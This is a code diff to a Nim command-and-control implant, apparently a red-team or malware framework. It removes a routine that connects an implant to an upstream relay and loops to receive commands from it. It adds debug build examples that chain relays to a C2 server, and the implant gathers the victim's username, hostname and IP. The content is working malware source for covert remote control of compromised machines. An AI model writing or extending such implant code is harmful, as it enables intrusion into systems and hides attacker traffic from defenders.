@@ -2536,95 +2536,16 @@ proc runMultiImplant*() {.async.} =
         echo "[DEBUG] User: " & getUsername()
         echo "[DEBUG] Hostname: " & getSysHostname()
         echo "[DEBUG] Local IP: " & getLocalIP()
-        echo "[DEBUG] Available relay commands:"
-        echo "[DEBUG]   relay port 9999          - Start relay server on port 9999"
-        echo "[DEBUG]   relay connect relay://ip:port - Connect to upstream relay"
-        echo "[DEBUG]   relay status             - Show relay status"
-        echo "[DEBUG]   relay stop               - Stop relay server"
-        echo "[DEBUG]   relay disconnect         - Disconnect from upstream"
-        echo "[DEBUG] "
-        echo "[DEBUG] Relay client build with FAST_MODE:"
-        echo "[DEBUG]   make darwin_arm64 RELAY_ADDRESS=relay://ip:port FAST_MODE=1 DEBUG=1"
+        echo "[DEBUG] HTTP Relay Build Examples:"
+        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay1:8080,c2:5000 DEBUG=1"
+        echo "[DEBUG]   make darwin_arm64 RELAY_PORT=8080 DEBUG=1"
+        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay2:8080,c2:5000 RELAY_PORT=8080 DEBUG=1"
         echo "[DEBUG] "
         echo "[DEBUG] Current client mode: " & (if CLIENT_FAST_MODE: "FAST_MODE" else: "NORMAL")
         echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
     
-    # Check if compiled as relay client by RELAY_ADDRESS
-    const RELAY_ADDR {.strdefine.}: string = ""
-    
-    when defined debug:
-        if RELAY_ADDR != "":
-            echo "[DEBUG] RELAY CLIENT MODE - Compiled with relay address"
-            echo "[DEBUG] Target relay address: " & RELAY_ADDR
-        else:
-            echo "[DEBUG] STANDARD MODE - No relay address specified"
-    
-    if RELAY_ADDR != "":
-        # Parse relay address - strip quotes if present
-        let cleanRelayAddr = RELAY_ADDR.strip(chars = {'"'})
-        when defined debug:
-            echo "[DEBUG] Cleaned relay address: " & cleanRelayAddr
-        
-        if cleanRelayAddr.startsWith("relay://"):
-            let urlParts = cleanRelayAddr[8..^1].split(":")
-            if urlParts.len == 2:
-                try:
-                    let host = urlParts[0]
-                    let port = parseInt(urlParts[1])
-                    
-                    when defined debug:
-                        echo "[DEBUG] Connecting to relay server: " & host & ":" & $port
-                    
-                    # Connect to upstream relay
-                    let result = connectToUpstreamRelay(host, port)
-                    
-                    when defined debug:
-                        echo "[DEBUG] Relay connection result: " & result
-                    
-                    if upstreamRelay.isConnected:
-                        when defined debug:
-                            echo "[DEBUG] ✅ Successfully connected to relay. Entering RELAY CLIENT mode."
-                            echo "[DEBUG] 🔗 PURE RELAY CLIENT MODE ACTIVATED"
-                            echo "[DEBUG] 📡 Running ONLY relay client handler - ALL traffic goes through relay server"
-                            echo "[DEBUG] 🚫 NO direct HTTP communication with C2"
-                            echo "[DEBUG] 📡 Relay client: Receives commands from upstream relay ONLY"
-                        
-                        # PURE RELAY CLIENT MODE: Only run relay client handler
-                        while true:
-                            try:
-                                when defined debug:
-                                    echo "[MAIN] 🚀 Starting PURE RELAY CLIENT mode (relay client only)"
-                                
-                                # Start only relay client handler
-                                let relayClientFuture = safeRelayClientHandler(host, port)
-                                
-                                # Wait for relay client to complete (should run indefinitely)
-                                await relayClientFuture
-                                
-                                when defined debug:
-                                    echo "[MAIN] 🔄 Relay client handler ended, restarting in 5 seconds..."
-                                
-                                await sleepAsync(5000)  # Wait before restart
-                            except Exception as e:
-                                when defined debug:
-                                    echo "[MAIN] 💥 Critical error in relay client loop: " & e.msg
-                                await sleepAsync(10000)  # Longer wait on critical error
-                    else:
-                        when defined debug:
-                            echo "[DEBUG] Failed to connect to relay. Exiting."
-                except:
-                    when defined debug:
-                        echo "[DEBUG] Invalid relay address format"
-                    return
-            else:
-                when defined debug:
-                    echo "[DEBUG] Invalid port format in relay URL"
-                return
-        else:
-            when defined debug:
-                echo "[DEBUG] Invalid relay URL format"
-            return
-    else:
+    # NEW HTTP Relay System: Uses RELAY_CHAIN for routing
+    # All relay functionality is now compile-time configured via RELAY_CHAIN and RELAY_PORT
         when defined debug:
             echo "[DEBUG] No relay address specified - continuing with STANDARD HTTP mode"
         
@@ -2665,15 +2586,10 @@ when isMainModule:
         echo "[DEBUG] User: " & getEnv("USER", "unknown")
         echo "[DEBUG] Hostname: " & getEnv("HOSTNAME", getEnv("COMPUTERNAME", "unknown"))
         echo "[DEBUG] Local IP: " & getLocalIP()
-        echo "[DEBUG] Available relay commands:"
-        echo "[DEBUG]   relay port 9999          - Start relay server on port 9999"
-        echo "[DEBUG]   relay connect relay://ip:port - Connect to upstream relay"
-        echo "[DEBUG]   relay status             - Show relay status"
-        echo "[DEBUG]   relay stop               - Stop relay server"
-        echo "[DEBUG]   relay disconnect         - Disconnect from upstream"
-        echo "[DEBUG] "
-        echo "[DEBUG] Relay client build with FAST_MODE:"
-        echo "[DEBUG]   make darwin_arm64 RELAY_ADDRESS=relay://ip:port FAST_MODE=1 DEBUG=1"
+        echo "[DEBUG] HTTP Relay Build Examples:"
+        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay1:8080,c2:5000 DEBUG=1"
+        echo "[DEBUG]   make darwin_arm64 RELAY_PORT=8080 DEBUG=1"
+        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay2:8080,c2:5000 RELAY_PORT=8080 DEBUG=1"
         echo "[DEBUG] "
         echo "[DEBUG] Current client mode: " & (if CLIENT_FAST_MODE: "FAST_MODE" else: "NORMAL")
         echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
